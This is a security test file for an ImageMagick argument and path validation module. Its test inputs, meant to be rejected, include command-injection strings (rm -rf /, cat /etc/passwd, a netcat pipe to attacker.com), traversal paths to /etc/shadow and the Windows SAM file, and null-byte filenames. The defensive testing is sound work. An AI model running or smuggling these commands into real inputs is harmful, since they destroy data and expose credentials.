/**
 * Security Tests
 *
 * Tests for input validation, command injection prevention,
 * and path traversal protection.
 */

import { describe, it, expect } from 'vitest';
import {
  sanitizeArgument,
  sanitizeArguments,
  validateFilePath,
  validateDirectoryPath,
  validateNumber,
  validateString,
} from '../src/utils/validation';
import * as path from 'path';

describe('Input Validation - Security Tests', () => {
  describe('sanitizeArgument', () => {
    it('should accept safe arguments', () => {
      expect(sanitizeArgument('convert')).toBe('convert');
      expect(sanitizeArgument('input.jpg')).toBe('input.jpg');
      expect(sanitizeArgument('output.png')).toBe('output.png');
      expect(sanitizeArgument('800x600')).toBe('800x600');
      expect(sanitizeArgument('-quality')).toBe('-quality');
    });

    it('should reject null bytes', () => {
      expect(() => sanitizeArgument('test\x00.exe')).toThrow('null byte');
      expect(() => sanitizeArgument('\x00 malicious')).toThrow('null byte');
    });

    it('should reject command injection with pipe', () => {
      expect(() => sanitizeArgument('test | rm -rf /')).toThrow('dangerous pattern');
      expect(() => sanitizeArgument('file.png | cat /etc/passwd')).toThrow('dangerous pattern');
    });

    it('should reject command injection with semicolon', () => {
      expect(() => sanitizeArgument('test; rm -rf /')).toThrow('dangerous pattern');
      expect(() => sanitizeArgument('file.png; malicious')).toThrow('dangerous pattern');
    });

    it('should reject command injection with ampersand', () => {
      expect(() => sanitizeArgument('test && rm -rf /')).toThrow('dangerous pattern');
      expect(() => sanitizeArgument('test & malicious')).toThrow('dangerous pattern');
    });

    it('should reject command substitution with $()', () => {
      expect(() => sanitizeArgument('$(rm -rf /)')).toThrow('dangerous pattern');
      expect(() => sanitizeArgument('file$(touch /tmp/pwn).png')).toThrow('dangerous pattern');
    });

    it('should reject command substitution with backticks', () => {
      expect(() => sanitizeArgument('`rm -rf /`')).toThrow('dangerous pattern');
      expect(() => sanitizeArgument('file`touch /tmp/pwn`.png')).toThrow('dangerous pattern');
    });

    it('should reject non-string arguments', () => {
      expect(() => sanitizeArgument(null as unknown as string)).toThrow('must be a string');
      expect(() => sanitizeArgument(undefined as unknown as string)).toThrow('must be a string');
      expect(() => sanitizeArgument(123 as unknown as string)).toThrow('must be a string');
      expect(() => sanitizeArgument({} as unknown as string)).toThrow('must be a string');
    });

    it('should accept special characters used in ImageMagick geometry', () => {
      // These are allowed but trigger warnings
      expect(sanitizeArgument('800x600+10+20')).toBe('800x600+10+20');
      expect(sanitizeArgument('50%')).toBe('50%');
      expect(sanitizeArgument('200x200!')).toBe('200x200!');
    });
  });

  describe('sanitizeArguments', () => {
    it('should sanitize array of safe arguments', () => {
      const args = ['convert', 'input.jpg', '-resize', '800x600', 'output.jpg'];
      const result = sanitizeArguments(args);
      expect(result).toEqual(args);
    });

    it('should reject non-array input', () => {
      expect(() => sanitizeArguments(null as unknown as string[])).toThrow('must be an array');
      expect(() => sanitizeArguments('test' as unknown as string[])).toThrow('must be an array');
    });

    it('should detect malicious arguments with index', () => {
      const args = ['convert', 'input.jpg', '-resize', '800x600; rm -rf /', 'output.jpg'];
      expect(() => sanitizeArguments(args)).toThrow(/index 3/);
    });

    it('should handle empty array', () => {
      const result = sanitizeArguments([]);
      expect(result).toEqual([]);
    });

    it('should sanitize all arguments', () => {
      const args = ['convert', 'input.jpg', '-resize', '800x600', 'output.jpg'];
      const result = sanitizeArguments(args);
      expect(result).toHaveLength(5);
      expect(result[0]).toBe('convert');
      expect(result[4]).toBe('output.jpg');
    });
  });

  describe('validateFilePath - Path Traversal Prevention', () => {
    it('should accept valid file paths', () => {
      expect(validateFilePath('./test.jpg')).toContain('test.jpg');
      expect(validateFilePath('image.png')).toContain('image.png');
      expect(validateFilePath('/home/user/photo.jpg')).toContain('photo.jpg');
    });

    it('should reject empty strings', () => {
      expect(() => validateFilePath('')).toThrow('non-empty string');
      expect(() => validateFilePath('   ')).toThrow('non-empty string');
    });

    it('should reject non-string input', () => {
      expect(() => validateFilePath(null as unknown as string)).toThrow('non-empty string');
      expect(() => validateFilePath(undefined as unknown as string)).toThrow('non-empty string');
    });

    it('should resolve relative paths', () => {
      const result = validateFilePath('./test.jpg');
      expect(path.isAbsolute(result)).toBe(true);
      expect(result).toContain('test.jpg');
    });

    it('should prevent path traversal when allowed directory is specified', () => {
      const allowedDir = '/home/user/images';

      expect(() => validateFilePath('../../../etc/passwd', allowedDir)).toThrow('Path traversal');
      expect(() => validateFilePath('/home/user/images/../../etc/passwd', allowedDir)).toThrow(
        'Path traversal'
      );
      expect(() => validateFilePath('../malicious', allowedDir)).toThrow('Path traversal');
    });

    it('should accept paths within allowed directory', () => {
      const allowedDir = '/home/user/images';

      const result1 = validateFilePath('/home/user/images/photo.jpg', allowedDir);
      expect(result1).toContain('photo.jpg');

      const result2 = validateFilePath('/home/user/images/subfolder/image.png', allowedDir);
      expect(result2).toContain('image.png');
    });

    it('should warn about .. and . components', () => {
      // Should not throw but should warn in development
      expect(() => validateFilePath('../test.jpg')).not.toThrow();
      expect(() => validateFilePath('./test.jpg')).not.toThrow();
    });
  });

  describe('validateDirectoryPath', () => {
    it('should accept valid directory paths', () => {
      expect(validateDirectoryPath('./output')).toContain('output');
      expect(validateDirectoryPath('/home/user/images')).toContain('images');
    });

    it('should reject empty strings', () => {
      expect(() => validateDirectoryPath('')).toThrow('non-empty string');
      expect(() => validateDirectoryPath('   ')).toThrow('non-empty string');
    });

    it('should reject non-string input', () => {
      expect(() => validateDirectoryPath(null as unknown as string)).toThrow('non-empty string');
      expect(() => validateDirectoryPath(undefined as unknown as string)).toThrow(
        'non-empty string'
      );
    });

    it('should resolve relative paths', () => {
      const result = validateDirectoryPath('./output');
      expect(path.isAbsolute(result)).toBe(true);
      expect(result).toContain('output');
    });
  });

  describe('validateNumber', () => {
    it('should accept valid numbers', () => {
      expect(validateNumber(85, 'quality')).toBe(85);
      expect(validateNumber(800, 'width')).toBe(800);
      expect(validateNumber('100', 'quality')).toBe(100);
      expect(validateNumber(0, 'value')).toBe(0);
    });

    it('should enforce minimum value', () => {
      expect(validateNumber(50, 'quality', 0)).toBe(50);
      expect(() => validateNumber(-1, 'quality', 0)).toThrow('at least 0');
      expect(() => validateNumber(10, 'quality', 50)).toThrow('at least 50');
    });

    it('should enforce maximum value', () => {
      expect(validateNumber(85, 'quality', undefined, 100)).toBe(85);
      expect(() => validateNumber(150, 'quality', 0, 100)).toThrow('at most 100');
      expect(() => validateNumber(101, 'quality', 0, 100)).toThrow('at most 100');
    });

    it('should reject NaN', () => {
      expect(() => validateNumber(NaN, 'value')).toThrow('valid number');
      expect(() => validateNumber('invalid', 'value')).toThrow('valid number');
    });

    it('should parse string numbers', () => {
      expect(validateNumber('85', 'quality')).toBe(85);
      expect(validateNumber('800', 'width')).toBe(800);
    });
  });

  describe('validateString', () => {
    it('should accept valid strings', () => {
      expect(validateString('test', 'param')).toBe('test');
      expect(validateString('hello world', 'param')).toBe('hello world');
    });

    it('should reject non-strings', () => {
      expect(() => validateString(123 as unknown as string, 'param')).toThrow('must be a string');
      expect(() => validateString(null as unknown as string, 'param')).toThrow('must be a string');
      expect(() => validateString(undefined as unknown as string, 'param')).toThrow(
        'must be a string'
      );
    });

    it('should enforce maximum length', () => {
      expect(validateString('test', 'param', 10)).toBe('test');
      expect(() => validateString('this is too long', 'param', 5)).toThrow('not exceed 5');
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent various injection patterns', () => {
      const payloads = [
        'file.png; cat /etc/passwd',
        'file.png && rm -rf /',
        'file.png | nc attacker.com 4444',
        'file.png `whoami`',
        'file.png $(id)',
      ];

      payloads.forEach((payload) => {
        expect(() => sanitizeArgument(payload)).toThrow('dangerous pattern');
      });
    });

    it('should prevent path traversal attacks', () => {
      const allowedDir = '/var/www/uploads';

      const attacks = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '/var/www/uploads/../../../etc/shadow',
        '....//....//....//etc/passwd',
      ];

      attacks.forEach((attack) => {
        expect(() => validateFilePath(attack, allowedDir)).toThrow('Path traversal');
      });
    });

    it('should prevent null byte injection', () => {
      const attacks = ['test.png\x00.exe', 'image.jpg\x00.php', '\x00malicious'];

      attacks.forEach((attack) => {
        expect(() => sanitizeArgument(attack)).toThrow('null byte');
      });
    });
  });

  describe('Edge cases', () => {
    it('should handle unicode strings', () => {
      expect(() => sanitizeArgument('画像.jpg')).not.toThrow();
      expect(() => sanitizeArgument('🖼️.png')).not.toThrow();
    });

    it('should handle very long strings', () => {
      const longString = 'a'.repeat(10000);
      expect(() => sanitizeArgument(longString)).not.toThrow();
    });

    it('should handle special characters that are safe in ImageMagick', () => {
      expect(() => sanitizeArgument('800x600+10+20')).not.toThrow();
      expect(() => sanitizeArgument('50%')).not.toThrow();
      expect(() => sanitizeArgument('200x200!')).not.toThrow();
      expect(() => sanitizeArgument('100x100>')).not.toThrow();
      expect(() => sanitizeArgument('100x100^')).not.toThrow();
      expect(() => sanitizeArgument('100x100@')).not.toThrow();
    });

    it('should handle paths with spaces', () => {
      expect(() => validateFilePath('./my image.jpg')).not.toThrow();
      expect(() => validateFilePath('/home/user/my photos/image.png')).not.toThrow();
    });

    it('should handle Windows paths', () => {
      if (process.platform === 'win32') {
        expect(() => validateFilePath('C:\\Users\\test\\image.jpg')).not.toThrow();
        expect(() => validateFilePath('D:\\photos\\vacation.png')).not.toThrow();
      }
    });
  });
});
